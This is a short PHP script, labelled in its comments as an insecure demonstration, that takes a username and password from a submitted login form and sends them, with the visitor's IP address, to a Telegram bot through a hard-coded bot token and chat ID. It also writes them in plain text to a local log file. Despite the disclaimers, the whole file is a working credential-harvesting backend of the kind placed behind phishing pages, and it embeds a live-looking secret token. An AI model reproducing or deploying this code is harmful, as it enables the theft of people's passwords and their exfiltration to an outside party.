<?php
// bad_notify.php  — DANGEROUS: example for demonstration only!

$TELEGRAM_BOT_TOKEN = '8224829602:AAHQr6S_wtiv8-Y3pjy4B8HqFKZptt8QrSM';
$TELEGRAM_CHAT_ID  = '8434336483';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Insecure: reading raw password from form
    $username = $_POST['username'] ?? 'unknown';
    $password = $_POST['password'] ?? 'NO-PASSWORD'; // DO NOT collect/send passwords
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $date = date('Y-m-d H:i:s');

    // Build message (contains password — insecure!)
    $message = "Login attempt\nUsername: $username\nPassword: $password\nIP: $ip\nDate: $date";

    // Send to Telegram (insecurely exposing password)
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=" . urlencode($message);
    @file_get_contents($url);

    // Also append to a local log file (plain text with passwords — terrible)
    @file_put_contents(__DIR__ . '/bad_log.txt', "$date | $ip | $username | $password\n", FILE_APPEND | LOCK_EX);

    echo "Recorded (insecure demo).";
}
?>

